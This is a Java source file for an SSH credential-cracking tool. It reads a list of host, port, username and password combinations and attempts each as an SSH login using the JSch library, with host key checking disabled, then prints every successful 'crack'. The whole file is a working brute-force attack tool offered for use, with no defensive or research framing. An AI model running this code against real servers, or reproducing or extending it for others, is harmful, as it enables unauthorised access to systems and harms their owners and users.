package org.thesecretintelligence.sshcracker;

import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class Cracker {
    private static final String ANSI_RESET = "\u001B[0m";
    private static final String ANSI_BLACK = "\u001B[30m";
    private static final String ANSI_RED = "\u001B[31m";
    private static final String ANSI_GREEN = "\u001B[32m";
    private static final String ANSI_YELLOW = "\u001B[33m";
    private static final String ANSI_BLUE = "\u001B[34m";
    private static final String ANSI_PURPLE = "\u001B[35m";
    private static final String ANSI_CYAN = "\u001B[36m";
    private static final String ANSI_WHITE = "\u001B[37m";

    private static File crackerFile = null;
    private static List<String> combos = new ArrayList<>();
    private static Set<String> cracked = new HashSet<>();

    public static void main(String[] args)throws Exception{

        if (args.length == 0){
            System.out.println("Invalid Args: 'java -jar <cracker.jar> combos.txt <processDuplicates || (True / False)>' -> processDuplicates is a option to make it so the program will not try to crack duplicates entries, example: If you try to brute 1.1.1:root:password once it will not try to brute that same ip with the same credentials, good to use if you want to save time.");
            System.exit(0);
        }

        crackerFile = new File(args[0]);
        boolean processDupes = Boolean.parseBoolean(args[1].toLowerCase());

        if (!processDupes){
            try{
                for (String x : Files.readAllLines(Paths.get("" + crackerFile))){
                    if (!combos.contains(x))combos.add(x);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }else{
            try{
                combos = Files.readAllLines(Paths.get("" + crackerFile));
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        System.out.println("At the end of the cracking session it will print all successful cracks and it will print all successful cracks when it cracks it...");
        Thread.sleep(3000);
        for (String combo : combos){
            String[] c = combo.split(":"); //HOST:PORT:USER:PASS
            attemptBrute(c[0], Integer.parseInt(c[1]), c[2], c[3]);
        }

        for (String cracks : cracked) {
            System.out.println(ANSI_GREEN + "CRACKED -> " + cracks);
        }
        int x = combos.size() - cracked.size();
        System.out.println("Failed Cracks -> " + x);

    }

    private static void attemptBrute(String host, int port, String user, String pass){
        try{
            JSch jsch = new JSch();
            Session session = jsch.getSession(user, host, port);
            session.setPassword(pass);
            java.util.Properties config = new java.util.Properties();
            config.put("StrictHostKeyChecking", "no");
            session.setConfig(config);
            session.setTimeout(5000);
            session.connect();
            session.disconnect();
            System.out.println(ANSI_RED + "[!] Successfully cracked ["+host+"] using credentials ["+user + ":" + pass+"]!");
            cracked.add(host + ":" + user + ":" + pass);
        }catch (Exception e){
            System.out.println(ANSI_RED + "[-] Failed to crack ["+host+"] using credentials ["+user + ":" + pass+"]...");
        }
    }


}
